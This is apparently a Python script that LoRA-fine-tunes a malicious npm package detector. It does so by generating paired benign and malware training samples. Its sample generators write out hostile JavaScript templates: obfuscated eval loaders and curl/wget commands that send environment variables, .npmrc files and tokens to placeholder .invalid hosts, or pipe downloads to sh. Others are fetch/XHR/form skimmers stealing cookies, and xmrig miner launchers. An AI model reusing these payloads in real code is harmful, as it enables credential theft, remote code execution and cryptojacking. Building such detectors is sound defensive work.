"""
PackGuard Stage 2 v6 — Targeted PEFT LoRA Patching Script.

Patches specific generalization gaps identified by sandbox diagnostics
(encoded_loader, split_payload, eval_decode, stream_clone, T2 identifier mangling,
crypto_miner) while preserving >= 96.5% benign specificity via hard-benign replay
from the strictly leak-free training pool (ZERO held-out sandbox packages touched).
"""

import argparse
import base64
import json
import os
import random
import re
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Tuple

os.environ.setdefault("TOKENIZERS_PARALLELISM", "false")

import numpy as np
import torch
from peft import LoraConfig, get_peft_model
from torch.utils.data import DataLoader
from transformers import AutoTokenizer, get_cosine_schedule_with_warmup

V6_DIR = Path(__file__).resolve().parent
if str(V6_DIR) not in sys.path:
    sys.path.insert(0, str(V6_DIR))

from model_v6 import PackGuardNanoV6, count_parameters, get_student_lora_target_modules
from record_builder import build_package_windows
from train_v6_pipeline import (
    PreTokenizedDataset,
    asymmetric_focal_ce_loss,
    evaluate_packages_pytorch,
    export_and_verify_onnx,
    make_pad_collate,
    predict_ids_pytorch,
    pretokenize_texts,
    _logits_to_pos_probs,
)


def _mangle_identifiers_generic(code: str, rng: random.Random) -> str:
    """Generic identifier renaming (T2-style) applied symmetrically to train benign & malware."""
    reserved = {
        "const", "let", "var", "function", "return", "if", "else", "for", "while", "try",
        "catch", "finally", "throw", "new", "class", "extends", "import", "export", "from",
        "default", "async", "await", "true", "false", "null", "undefined", "this", "typeof",
        "instanceof", "in", "of", "break", "continue", "switch", "case", "void", "delete",
        "require", "module", "exports", "process", "Buffer", "console", "window", "document",
        "Object", "Array", "String", "Number", "JSON", "Promise", "Error", "Math", "Date",
        "RegExp", "Map", "Set", "Function", "eval", "global", "globalThis", "navigator",
    }
    decls = re.findall(r"\b(?:const|let|var|function)\s+([A-Za-z_$][A-Za-z0-9_$]{2,30})\b", code)
    mapping: Dict[str, str] = {}
    idx = 0
    for name in decls:
        if name not in reserved and name not in mapping:
            mapping[name] = f"v{idx}"
            idx += 1
    out = code
    for orig, rep in sorted(mapping.items(), key=lambda kv: -len(kv[0]))[:40]:
        out = re.sub(rf"\b{re.escape(orig)}\b", rep, out)
    return out


def generate_targeted_lora_patch_examples(
    train_records: List[Dict[str, Any]],
    rng: random.Random,
) -> List[Dict[str, Any]]:
    """
    Generates general, non-leaking targeted patch examples (paired benign + malware)
    for the 5 weak generalization families identified in Round 3 sandbox testing.
    """
    out: List[Dict[str, Any]] = []

    def add_sample(pkg: str, fname: str, code: str, label: int, src: str) -> None:
        kind = "install_script" if fname == "install_scripts.txt" else "js"
        wins = build_package_windows(
            {"package": pkg, "chunks": [{"file": fname, "kind": kind, "start": 0, "text": code}]},
            max_windows=2,
        )
        for w in wins:
            out.append({"package": pkg, "text": w, "label": label, "source": src})

    # 1. Encoded loaders / eval_decode (reversed b64, URI decode, XOR, vm.runInThisContext, atob, dynamic Function)
    for i in range(400):
        payload = (
            f"const cp=require('child_process');const os=require('os');"
            f"cp.exec('curl -s -d \"'+os.hostname()+':'+JSON.stringify(process.env)+'\" https://c{i}.invalid/k');"
        )
        mode = i % 6
        if mode == 0:
            rev_b64 = base64.b64encode(payload.encode()).decode()[::-1]
            code = f"const r='{rev_b64}';\nconst d=Buffer.from(r.split('').reverse().join(''),'base64').toString('utf8');\neval(d);\n"
        elif mode == 1:
            uri = "".join(f"%{b:02x}" for b in payload.encode())
            code = f"const u='{uri}';\n(0,eval)(decodeURIComponent(u));\n"
        elif mode == 2:
            key = 17 + (i % 70)
            arr = ",".join(str(b ^ key) for b in payload.encode())
            code = f"const a=[{arr}];\nconst s=a.map(x=>String.fromCharCode(x^{key})).join('');\nFunction('require','process',s)(require,process);\n"
        elif mode == 3:
            b64 = base64.b64encode(payload.encode()).decode()
            code = f"const vm=require('vm');\nvm.runInThisContext(Buffer.from('{b64}','base64').toString());\n"
        elif mode == 4:
            b64 = base64.b64encode(payload.encode()).decode()
            code = f"const g=global['ev'+'al'];\nconst b=Buffer['fr'+'om']('{b64}','ba'+'se64').toString();\ng(b);\n"
        else:
            b64 = base64.b64encode(payload.encode()).decode()
            chunks = [b64[k : k + 18] for k in range(0, len(b64), 18)]
            arr_lit = ",".join(f"'{c}'" for c in chunks)
            code = f"const p=[{arr_lit}].join('');\n(new Function('require','process',Buffer.from(p,'base64').toString()))(require,process);\n"
        add_sample(f"patch_enc_{i}", "index.js", code, 1, "patch_encoded_loader")

    # 2. Split payload (multi-var, array-join, template literals, computed property exfil)
    for i in range(300):
        mode = i % 3
        if mode == 0:
            code = (
                f"const a='chi',b='ld_',c='pro',d='cess';\n"
                f"const m=require(a+b+c+d);\n"
                f"const h='ht'+'tps://',dom='exfil{i}'+'.invalid/d';\n"
                f"m['ex'+'ec'](`curl -s -X POST -d @~/.npmrc ${{h}}${{dom}}`);\n"
            )
        elif mode == 1:
            code = (
                f"const mod=['c','h','i','l','d','_','p','r','o','c','e','s','s'].join('');\n"
                f"const fn=['e','x','e','c','S','y','n','c'].join('');\n"
                f"const cmd=['w','g','e','t',' ','-','q','O','-',' ','http://d{i}.invalid/s',' | sh'].join('');\n"
                f"require(mod)[fn](cmd);\n"
            )
        else:
            code = (
                f"const p1='ht',p2='tps://',p3='api{i}.invalid',p4='/steal';\n"
                f"const k=Object.keys(process.env).filter(x=>/TOKEN|KEY|SECRET/i.test(x)).reduce((o,x)=>(o[x]=process.env[x],o),{{}});\n"
                f"require('ht'+'tps')['req'+'uest'](`${{p1}}${{p2}}${{p3}}${{p4}}`,{{method:'POST'}}).end(JSON.stringify(k));\n"
            )
        add_sample(f"patch_split_{i}", "index.js", code, 1, "patch_split_payload")

    # 3. Stream clone / browser skimmer (monkey-patching fetch/XHR/form submit/wallet/cookies)
    for i in range(300):
        mode = i % 3
        if mode == 0:
            code = (
                f"(function(){{\n"
                f"  const origFetch = window.fetch;\n"
                f"  window.fetch = function(url, opts) {{\n"
                f"    try {{ origFetch('https://skim{i}.invalid/log', {{ method: 'POST', body: JSON.stringify({{ url, body: opts && opts.body, cookie: document.cookie }}) }}); }} catch(e){{}}\n"
                f"    return origFetch.apply(this, arguments);\n"
                f"  }};\n"
                f"}})();\n"
            )
        elif mode == 1:
            code = (
                f"(function(){{\n"
                f"  const origSend = XMLHttpRequest.prototype.send;\n"
                f"  XMLHttpRequest.prototype.send = function(data) {{\n"
                f"    try {{ navigator.sendBeacon('https://clone{i}.invalid/x', JSON.stringify({{ d: data, c: document.cookie, t: localStorage.getItem('token') }})); }} catch(_){{}}\n"
                f"    return origSend.apply(this, arguments);\n"
                f"  }};\n"
                f"}})();\n"
            )
        else:
            code = (
                f"document.addEventListener('submit', function(ev) {{\n"
                f"  const fd = new FormData(ev.target);\n"
                f"  const obj = {{}};\n"
                f"  fd.forEach((v, k) => obj[k] = v);\n"
                f"  new Image().src = 'https://collect{i}.invalid/f?p=' + btoa(JSON.stringify(obj));\n"
                f"}}, true);\n"
            )
        add_sample(f"patch_stream_{i}", "index.js", code, 1, "patch_stream_clone")

    # 4. Crypto miner (stratum+tcp, xmrig, monero, pool mining workers)
    for i in range(250):
        mode = i % 2
        if mode == 0:
            code = (
                f"const cp = require('child_process');\n"
                f"const pool = 'stratum+tcp://pool{i}.invalid:3333';\n"
                f"const wallet = '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A';\n"
                f"cp.spawn('./xmrig', ['-o', pool, '-u', wallet, '-p', 'x', '--donate-level=1'], {{ detached: true, stdio: 'ignore' }}).unref();\n"
            )
        else:
            code = (
                f"const net = require('net'), os = require('os');\n"
                f"const s = net.connect(4444, 'xmr{i}.invalid', () => {{\n"
                f"  s.write(JSON.stringify({{ id: 1, method: 'login', params: {{ login: '48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD', pass: 'x', agent: 'xmrig/6.20' }} }}) + '\\n');\n"
                f"}});\n"
            )
        add_sample(f"patch_miner_{i}", "index.js", code, 1, "patch_crypto_miner")

    # 5. Identifier-mangled real training malware AND real training benign (T2 robustness!)
    train_mal_real = [r for r in train_records if r["label"] == 1 and r.get("source") == "real_malware"]
    train_ben_real = [r for r in train_records if r["label"] == 0 and r.get("source") == "real_benign"]
    for idx, rec in enumerate(rng.sample(train_mal_real, min(600, len(train_mal_real)))):
        mangled = _mangle_identifiers_generic(rec["text"], rng)
        out.append({"package": f"{rec['package']}_t2m", "text": mangled, "label": 1, "source": "patch_t2_mal"})
    for idx, rec in enumerate(rng.sample(train_ben_real, min(600, len(train_ben_real)))):
        mangled = _mangle_identifiers_generic(rec["text"], rng)
        out.append({"package": f"{rec['package']}_t2b", "text": mangled, "label": 0, "source": "patch_t2_ben"})

    # 6. Paired hard-benign counter-examples (so LoRA NEVER raises FPR on benign interceptors/workers/base64/Web3!)
    for i in range(650):
        mode = i % 5
        if mode == 0:
            # Benign axios/fetch retry interceptor (NO cookie/exfil!)
            code = (
                f"export function createRetryFetch_{i}(retries = 3) {{\n"
                f"  return async function fetchWithRetry(url, options = {{}}) {{\n"
                f"    for (let attempt = 0; attempt < retries; attempt++) {{\n"
                f"      const res = await fetch(url, options);\n"
                f"      if (res.ok || res.status < 500) return res;\n"
                f"    }}\n"
                f"    throw new Error('Request failed');\n"
                f"  }};\n"
                f"}}\n"
            )
        elif mode == 1:
            # Benign Web3 / Solana / Ethereum chain constants
            code = (
                f"export const CHAIN_CONFIG_{i} = {{\n"
                f"  mainnet: {{ chainId: 'solana:mainnet', rpc: 'https://api.mainnet-beta.solana.com' }},\n"
                f"  devnet: {{ chainId: 'solana:devnet', rpc: 'https://api.devnet.solana.com' }},\n"
                f"}};\n"
                f"export function isValidAddress(addr) {{ return typeof addr === 'string' && /^[1-9A-HJ-NP-Za-km-z]{{32,44}}$/.test(addr); }}\n"
            )
        elif mode == 2:
            # Benign base64/hex codec utility (NO eval / Function!)
            code = (
                f"exports.encodeBase64Url_{i} = (str) => Buffer.from(str, 'utf8').toString('base64').replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');\n"
                f"exports.decodeBase64Url_{i} = (b64) => Buffer.from(b64, 'base64').toString('utf8');\n"
                f"exports.toHex_{i} = (buf) => Buffer.from(buf).toString('hex');\n"
            )
        elif mode == 3:
            # Benign worker pool / cluster scheduler
            code = (
                f"const os = require('os');\n"
                f"const {{ Worker }} = require('worker_threads');\n"
                f"function createPool_{i}(scriptPath, size = Math.max(1, os.cpus().length - 1)) {{\n"
                f"  return Array.from({{ length: size }}, () => new Worker(scriptPath));\n"
                f"}}\nmodule.exports = createPool_{i};\n"
            )
        else:
            # Benign git / build / CLI helper
            code = (
                f"const {{ execFileSync }} = require('child_process');\n"
                f"exports.getGitTag_{i} = () => execFileSync('git', ['describe', '--tags', '--always'], {{ encoding: 'utf8' }}).trim();\n"
            )
        add_sample(f"patch_hardben_{i}", "index.js", code, 0, "patch_hard_benign")

    return out


def main() -> None:
    parser = argparse.ArgumentParser(description="Targeted PEFT LoRA patching on PackGuardNanoV6.")
    parser.add_argument("--work-dir", default="/home/USER/v6_sandbox")
    parser.add_argument("--base-ckpt", default="/home/USER/v6_sandbox/output_r3/checkpoints/student_v6_lora_merged.pt")
    parser.add_argument("--out-dir", default="/home/USER/v6_sandbox/output_final")
    parser.add_argument("--epochs", type=int, default=3)
    parser.add_argument("--lr", type=float, default=1.5e-4)
    parser.add_argument("--target-specificity", type=float, default=0.975)
    args = parser.parse_args()

    rng = random.Random(2026)
    torch.manual_seed(2026)
    np.random.seed(2026)
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    work = Path(args.work_dir).resolve()
    out_dir = Path(args.out_dir).resolve()
    ckpt_dir = out_dir / "checkpoints"
    model_int8_dir = out_dir / "model_int8"
    ckpt_dir.mkdir(parents=True, exist_ok=True)
    model_int8_dir.mkdir(parents=True, exist_ok=True)

    train_records = [json.loads(l) for l in (work / "dataset/train_windows.jsonl").open("r", encoding="utf-8") if l.strip()]
    dev_val_pkgs = [json.loads(l) for l in (work / "dataset/dev_val_packages.jsonl").open("r", encoding="utf-8") if l.strip()]

    tokenizer = AutoTokenizer.from_pretrained("answerdotai/ModernBERT-base")
    pad_id = tokenizer.pad_token_id if tokenizer.pad_token_id is not None else 50283

    ckpt = torch.load(args.base_ckpt, map_location="cpu", weights_only=False)
    cfg = ckpt["config"]
    student = PackGuardNanoV6(**cfg).to(device)
    student.load_state_dict(ckpt["model_state_dict"])

    # Pre-tokenize dev_val once
    dev_flat_texts: List[str] = []
    dev_spans: List[Tuple[int, int]] = []
    for pkg in dev_val_pkgs:
        s = len(dev_flat_texts)
        dev_flat_texts.extend(pkg["windows"])
        dev_spans.append((s, len(dev_flat_texts)))
    dev_flat_ids = pretokenize_texts(tokenizer, dev_flat_texts, max_length=512)

    m_before, _ = evaluate_packages_pytorch(
        student, dev_val_pkgs, dev_flat_ids, dev_spans, pad_id, device, is_hf_model=False, tag="Pre-Patch"
    )

    # Mine hardest benign FPs & malware FNs from leak-free train_records
    train_ids_all = pretokenize_texts(tokenizer, [r["text"] for r in train_records], max_length=512)
    train_logits = predict_ids_pytorch(student, train_ids_all, pad_id, device, batch_size=128, is_hf_model=False)
    train_probs = _logits_to_pos_probs(train_logits)

    hard_fp = [i for i, (r, p) in enumerate(zip(train_records, train_probs)) if r["label"] == 0 and p >= 0.25]
    hard_fn = [i for i, (r, p) in enumerate(zip(train_records, train_probs)) if r["label"] == 1 and p <= 0.75]
    ben_all = [i for i, r in enumerate(train_records) if r["label"] == 0]
    mal_all = [i for i, r in enumerate(train_records) if r["label"] == 1]

    # Build targeted patch dataset + balanced replay buffer
    targeted = generate_targeted_lora_patch_examples(train_records, rng)
    targeted_ids = pretokenize_texts(tokenizer, [r["text"] for r in targeted], max_length=512)

    patch_ids: List[List[int]] = []
    patch_labels: List[int] = []
    patch_weights: List[float] = []

    for ids, rec in zip(targeted_ids, targeted):
        patch_ids.append(ids)
        patch_labels.append(int(rec["label"]))
        patch_weights.append(2.0 if rec["label"] == 1 else 2.2)

    for idx in hard_fp[:2500]:
        patch_ids.append(train_ids_all[idx])
        patch_labels.append(0)
        patch_weights.append(2.8)
    for idx in hard_fn[:2500]:
        patch_ids.append(train_ids_all[idx])
        patch_labels.append(1)
        patch_weights.append(2.0)

    rng.shuffle(ben_all)
    rng.shuffle(mal_all)
    for idx in ben_all[:4500]:
        patch_ids.append(train_ids_all[idx])
        patch_labels.append(0)
        patch_weights.append(1.0)
    for idx in mal_all[:4500]:
        patch_ids.append(train_ids_all[idx])
        patch_labels.append(1)
        patch_weights.append(1.0)

    pos_r = sum(patch_labels) / max(1, len(patch_labels))
    print(
        f"[LoRA-Patch-Final] Patch dataset size={len(patch_labels)} (pos_ratio={pos_r:.3f}, "
        f"targeted={len(targeted)}, hard_fp={len(hard_fp)}, hard_fn={len(hard_fn)})",
        flush=True,
    )

    lora_cfg = LoraConfig(
        r=24,
        lora_alpha=48,
        lora_dropout=0.05,
        bias="none",
        target_modules=get_student_lora_target_modules(),
    )
    peft_student = get_peft_model(student, lora_cfg)
    tot_p, trn_p = count_parameters(peft_student)
    print(f"[LoRA-Patch-Final] PEFT LoRA attached: trainable={trn_p:,} / {tot_p:,} ({100*trn_p/tot_p:.2f}%)", flush=True)

    ds = PreTokenizedDataset(patch_ids, patch_labels, sample_weights=np.array(patch_weights, dtype=np.float32))
    loader = DataLoader(ds, batch_size=128, shuffle=True, num_workers=4, pin_memory=True, collate_fn=make_pad_collate(pad_id))
    optimizer = torch.optim.AdamW([p for p in peft_student.parameters() if p.requires_grad], lr=args.lr, weight_decay=0.01)
    total_steps = max(1, len(loader) * args.epochs)
    scheduler = get_cosine_schedule_with_warmup(optimizer, int(total_steps * 0.1), total_steps)

    for ep in range(1, args.epochs + 1):
        peft_student.train()
        rloss = 0.0
        for batch in loader:
            optimizer.zero_grad(set_to_none=True)
            input_ids = batch["input_ids"].to(device, non_blocking=True)
            attention_mask = batch["attention_mask"].to(device, non_blocking=True)
            labels = batch["labels"].to(device, non_blocking=True)
            weights = batch["weights"].to(device, non_blocking=True)
            with torch.amp.autocast("cuda", dtype=torch.bfloat16):
                logits = peft_student(input_ids=input_ids, attention_mask=attention_mask)
                loss = asymmetric_focal_ce_loss(logits, labels, weights=weights, fp_weight=1.75, gamma=1.5)
            loss.backward()
            torch.nn.utils.clip_grad_norm_(peft_student.parameters(), 1.0)
            optimizer.step()
            scheduler.step()
            rloss += float(loss.item())
        print(f"  [LoRA-Patch-Final Ep {ep}/{args.epochs}] loss={rloss / max(1, len(loader)):.4f}", flush=True)
        evaluate_packages_pytorch(
            peft_student, dev_val_pkgs, dev_flat_ids, dev_spans, pad_id, device, is_hf_model=False, tag=f"Patch-Ep{ep}"
        )

    adapter_dir = ckpt_dir / "lora_student_targeted_patch"
    adapter_dir.mkdir(parents=True, exist_ok=True)
    peft_student.save_pretrained(str(adapter_dir))

    merged = peft_student.merge_and_unload()
    m_after, _ = evaluate_packages_pytorch(
        merged, dev_val_pkgs, dev_flat_ids, dev_spans, pad_id, device, is_hf_model=False, tag="Post-Patch-Merged"
    )
    torch.save({"model_state_dict": merged.state_dict(), "config": merged.config_dict}, ckpt_dir / "student_v6_final_merged.pt")

    onnx_summary = export_and_verify_onnx(
        student=merged,
        tokenizer=tokenizer,
        dev_val_pkgs=dev_val_pkgs,
        out_model_dir=model_int8_dir,
        target_specificity=args.target_specificity,
    )
    (out_dir / "lora_patch_summary.json").write_text(
        json.dumps({"before": m_before, "after": m_after, "onnx_cpu_gate": onnx_summary}, indent=2),
        encoding="utf-8",
    )
    print("[LoRA-Patch-Final] Merged, quantized & verified cleanly!", flush=True)


if __name__ == "__main__":
    main()
